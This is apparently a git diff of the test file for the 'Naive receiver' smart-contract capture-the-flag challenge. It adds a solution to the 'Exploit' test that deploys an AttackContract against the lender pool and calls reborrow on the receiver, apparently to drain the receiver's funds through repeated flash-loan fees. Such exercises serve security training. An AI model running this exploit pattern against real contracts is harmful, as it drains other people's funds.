@@ -1,8 +1,9 @@
-const { ether, balance } = require('@openzeppelin/test-helpers');
+const { ether, balance, BN } = require('@openzeppelin/test-helpers');
 const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 
 const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
 const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
+const attackContract = contract.fromArtifact('AttackContract');
 
 const { expect } = require('chai');
 
@@ -29,9 +30,11 @@ describe('[Challenge] Naive receiver', function () {
         
         expect(await balance.current(this.receiver.address)).to.be.bignumber.equal(ETHER_IN_RECEIVER);
     });
-
+    
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const attackBot = await attackContract.new(this.pool.address, {from: attacker});
+        await attackBot.reborrow(this.receiver.address, 0, {from: attacker});
     });
 
     after(async function () {
